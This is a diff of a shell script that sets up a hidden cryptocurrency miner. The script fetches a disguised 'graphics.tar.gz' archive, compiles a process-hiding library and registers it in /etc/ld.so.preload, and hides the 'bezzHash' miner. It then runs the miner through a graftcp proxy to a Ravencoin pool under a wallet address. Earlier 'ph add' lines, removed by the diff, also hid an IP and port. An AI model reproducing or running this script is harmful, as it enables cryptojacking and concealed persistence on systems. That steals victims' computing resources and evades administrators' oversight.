@@ -6,13 +6,7 @@ npm i -g node-process-hider
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-ph add 
-ph add graftcp/graftcp
-ph add graftcp
-ph add 176.53.133.217:57597
-ph add listen
-ph add node
-ph add bezzHash
+
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
@@ -51,5 +45,6 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+ph add bezzHash
 
 ./graftcp/graftcp ./bezzHash --url=REEbR2d3Ju3F5tfug3P81qeb4nd79tjC4e.$(echo $(shuf -i 1-99999 -n 1)-hunterd)@us-rvn.2miners.com:6060
